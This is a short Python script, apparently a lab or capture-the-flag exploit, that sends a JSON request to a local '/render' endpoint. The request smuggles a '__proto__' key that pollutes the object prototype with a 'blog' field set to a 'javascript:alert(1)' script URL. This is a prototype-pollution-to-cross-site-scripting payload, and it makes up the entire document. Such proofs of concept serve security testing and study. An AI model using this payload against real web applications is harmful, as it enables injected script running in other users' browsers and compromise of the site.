import requests

payload = {
    "username": "admin",
    "__proto__": {
        "blog": "javascript:alert(1)"
    }
}

r = requests.post("http://127.0.0.1:9090/render", json=payload)
print(r.status_code, r.text)
